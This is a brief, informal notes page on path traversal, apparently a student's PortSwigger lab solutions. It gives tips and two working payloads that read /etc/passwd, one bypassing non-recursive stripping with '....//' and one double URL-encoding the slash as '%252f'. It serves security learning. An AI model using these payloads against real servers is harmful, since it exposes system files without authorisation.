# Path Traversal

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders" %}

## We Know

* Poison byte for file extension
* Validation at start of path
* Always try mentioning just the full path of file you're trying to access

## PortSwigger Labs

### Lab 2 (Non recursive file traversal stripping)

`/image?filename=....//....//....//etc/passwd`

You already know the logic lmao

### Lab 3 (Traversal sequences stripped with superfluous URL-decode)

They said the app performs a URL decode before reading the input AGGGHHHHHHH

`/image?filename=..%252f..%252f..%252fetc/passwd`

the '/' was URL encoded twice, first normal decode and second they specifically mentioned they'd decode again smh
